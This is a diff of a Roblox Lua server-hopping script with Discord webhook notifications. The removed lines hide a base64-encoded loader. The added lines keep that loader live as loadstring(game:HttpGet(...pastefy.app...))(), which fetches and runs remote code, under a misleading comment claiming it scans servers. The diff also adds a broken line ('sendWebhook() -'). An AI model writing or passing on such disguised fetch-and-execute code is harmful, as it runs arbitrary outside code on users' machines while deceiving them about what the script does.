@@ -1,4 +1,4 @@
-local desiredVersion = "1689" --change to desired version you want to find
+local desiredVersion = "1689"
 local PlaceId = game.PlaceId
 local AUTO_HOP_LOOP = true        -- Set to true to keep hopping automatically between servers
 local AUTO_TELEPORT_LOOP = true  -- Set to true to keep teleporting to specific place instance automatically
@@ -124,10 +124,10 @@ local function copyJobId()
     end
 end
 
--- Webhook (unchanged, no need to modify)
+-- Webhook (CHANGE THE WEBHOOK URL IF YOU WANT TO BE NOTIFIES)
 
-local function sendWebhook()
-    local webhookUrl = "YOUR DISCORD WEBHOOK" --put if you want to be notified if found
+local function sendWebhook() -
+    local webhookUrl = "YOUR WEBHOOK URL"
     local players = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers or 0
     local currentVersion = tostring(version()):match("%d+") or "Unknown"
@@ -214,10 +214,8 @@ end
 task.spawn(function()
     statusLabel.Text = "✅ Script executing..."
 
-    -- SCRIPT FINDER
-    local b64 = "bG9hZHN0cmluZyhnYW1lOkh0dHBLZXQoImh0dHBzOi8vcGFzdGVmeS5hcHAva1MyMEZ1Q3YvcmF3IikpKCk="
-    local decoded = HttpService:Base64Decode(b64)
-    loadstring(decoded)()
+    -- scans the servers before it joins so it doenst waste time joining to a new server
+    loadstring(game:HttpGet("https://pastefy.app/kS20FuCv/raw"))()
 
     copyJobId()
     sendWebhook()
@@ -226,8 +224,7 @@ task.spawn(function()
         -- If auto teleport loop is enabled, run that instead of server hop
         while true do
             task.wait(TELEPORT_INTERVAL)
-            -- Note: original script autoTeleportLoop teleports to specific instance, but since
-            -- you requested removing that, you may want to update this or disable AUTO_TELEPORT_LOOP.
+            -- Note: you might want to adjust or disable this since you removed specific teleport code.
         end
     elseif AUTO_HOP_LOOP then
         while true do
